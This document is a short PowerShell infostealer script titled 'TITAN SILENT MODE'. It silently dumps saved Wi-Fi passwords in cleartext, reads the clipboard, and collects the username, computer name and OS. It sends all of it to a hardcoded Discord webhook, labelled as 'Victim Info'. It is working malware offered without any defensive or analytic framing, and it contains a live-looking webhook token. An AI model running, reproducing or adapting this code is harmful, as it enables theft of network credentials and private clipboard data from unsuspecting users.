# =====================[ TITAN SILENT MODE ]=======================
$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Web

$webhook = "https://discord.com/api/webhooks/1356723527486804138/8uoObVFzZbql8opsETphWlbiXPSbYSZOgSW9mxfx_-A4olDcCGD3FQvslxUJ4UjvCE_L"

function Send-Discord($msg) {
    $payload = @{content = $msg} | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhook -Method POST -Body $payload -ContentType 'application/json'
}

# =====================[ WLAN KEYS ]=======================
$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
$wifiResult = ""
foreach ($profile in $wifiProfiles) {
    $keyOutput = netsh wlan show profile name="$profile" key=clear
    $keyLine = $keyOutput | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifiResult += "📶 $profile → 🔑 $keyLine`n"
}
Send-Discord "**[WLAN KEYS]**`n$wifiResult"

# =====================[ CLIPBOARD ]=======================
$clip = Get-Clipboard
if ($clip -ne "") {
    Send-Discord "**[Clipboard]**`n$clip"
}

# =====================[ USER/OS INFO ]=======================
$u = $env:USERNAME
$p = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
Send-Discord "**[Victim Info]**`n👤 $u`n🖥️ $p`n💿 $os"

# =====================[ END ]=======================
exit
